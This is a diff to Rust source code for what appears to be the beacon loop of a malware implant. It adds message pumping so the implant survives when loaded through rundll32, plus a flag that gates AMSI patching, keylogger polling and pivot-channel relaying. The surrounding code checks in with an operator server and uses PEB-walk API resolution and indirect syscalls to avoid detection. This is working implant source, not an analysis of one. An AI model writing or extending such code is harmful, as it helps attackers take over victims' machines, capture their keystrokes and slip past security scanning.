@@ -30,8 +30,43 @@ static SLEEP_SECS: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32
 /// frame cap; we flush early when the accumulated batch would cross this.
 const BATCH_FLUSH: usize = 200 * 1024;
 
+/// Pump pending window messages so rundll32's hidden window doesn't block.
+/// rundll32 creates a window and expects the entry function to handle messages.
+/// Without pumping, the system considers the process unresponsive and may kill it.
+fn pump_window_messages() {
+    // PEB-resolve PeekMessageW + DispatchMessageW + TranslateMessage from user32.dll.
+    // These are no-ops if user32.dll isn't loaded (e.g. loaded into a non-GUI process).
+    unsafe {
+        let peek = crate::resolve::export_addr(b"user32.dll", b"PeekMessageW");
+        let dispatch = crate::resolve::export_addr(b"user32.dll", b"DispatchMessageW");
+        let (Some(peek), Some(dispatch)) = (peek, dispatch) else {
+            return; // user32 not loaded — nothing to pump.
+        };
+        // PeekMessageW(msg, hwnd=NULL, 0, 0, PM_REMOVE=1) -> BOOL
+        type PeekMessageW = unsafe extern "system" fn(*mut [u8; 48], *mut core::ffi::c_void, u32, u32, u32) -> i32;
+        type DispatchMessageW = unsafe extern "system" fn(*const [u8; 48]) -> usize;
+        let peek_fn: PeekMessageW = core::mem::transmute(peek);
+        let dispatch_fn: DispatchMessageW = core::mem::transmute(dispatch);
+        let mut msg: [u8; 48] = [0; 48]; // MSG struct on x64 = 48 bytes
+        while peek_fn(&mut msg, core::ptr::null_mut(), 0, 0, 1) != 0 {
+            dispatch_fn(&msg);
+        }
+    }
+}
+
+/// When false (noevasion mode), beacon_loop skips AMSI patching, keylog
+/// polling, and channel pumping — all of which depend on the evasion init
+/// (hookchain/blind) that `init_minimal` skips.
+static EVASION_ACTIVE: core::sync::atomic::AtomicBool = core::sync::atomic::AtomicBool::new(true);
+
+/// Called by entry.rs before beacon_loop to disable evasion-dependent calls.
+pub fn set_evasion_off() {
+    EVASION_ACTIVE.store(false, core::sync::atomic::Ordering::Release);
+}
+
 /// The beacon loop, called from `nyx_entry` after resolve + alloc bootstrap.
 pub unsafe fn beacon_loop() {
+    crate::entry::diag_mark(b"L0_loop_start");
     // Try per-implant runtime config first (patched .nyx_cfg section).
     // Falls back to compile-time config if the section is unpatched.
     let (cfg, implant, config_plain) =
@@ -92,6 +127,7 @@ pub unsafe fn beacon_loop() {
     // Borrow the indirect-syscall runtime (initialized by entry). File ops fall
     // back to an explicit error if it isn't up — they cannot run without it.
     let rt = crate::syscalls::global();
+    crate::entry::diag_mark(b"L1_rt");
 
     // ---- check-in (retry, capped) ----
     // M2: cap the check-in retries. If the server registers the session but the
@@ -107,9 +143,11 @@ pub unsafe fn beacon_loop() {
     loop {
         let frame = encode_frame(&pubkey, counter, &key, &info_plain);
         counter += 1;
+        crate::entry::diag_mark(b"L2_checkin_send");
         let resp = unsafe {
             crate::channels::dispatch_send_recv(&ch_ctx, crate::channels::get_active(), &frame)
         };
+        crate::entry::diag_mark(b"L3_checkin_recv");
         if resp.is_some() {
             break;
         }
@@ -134,7 +172,7 @@ pub unsafe fn beacon_loop() {
         // Retry AMSI blinding: capped at 10 cycles (amsi.dll demand-loads only
         // when a scanner starts). After cycle 10 or on success, stop the PEB
         // walk to eliminate the per-cycle IOC.
-        if !amsi_patched && cycle < 10 {
+        if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) && !amsi_patched && cycle < 10 {
             unsafe {
                 crate::blind::maybe_patch_amsi();
             }
@@ -142,21 +180,30 @@ pub unsafe fn beacon_loop() {
         }
         let secs = SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed);
         cycle = cycle.saturating_add(1);
+        // Pump window messages once per cycle. rundll32 creates a hidden window
+        // and expects the entry function to handle messages — if we block in an
+        // infinite loop without pumping, the system kills the process for being
+        // unresponsive. PeekMessageW/DispatchMessageW are resolved via PEB walk.
+        pump_window_messages();
         sleep_jitter(secs, cfg.jitter_pct);
         // Sample the keyboard once per cycle while the keylogger is active.
         // poll_once self-guards on KEYLOG_ACTIVE, so an unconditional call is
         // a no-op when keylogging isn't running — no extra cost in the common
         // case. (Coarse: ~1 sample per sleep interval — see keylog.rs docs.)
-        crate::keylog::poll_once();
+        if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) {
+            crate::keylog::poll_once();
+        }
 
         // Drain relay sockets — bytes read since last cycle ride as Channel
         // data on this POST. task_id 0 marks async channel data (correlated by
         // Response::Channel.chan on the operator side, not by task_id).
-        for r in crate::pivot::pump_channels() {
-            pending.push(TaskResponse {
-                task_id: 0,
-                response: r,
-            });
+        if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) {
+            for r in crate::pivot::pump_channels() {
+                pending.push(TaskResponse {
+                    task_id: 0,
+                    response: r,
+                });
+            }
         }
 
         let frame = encode_frame(
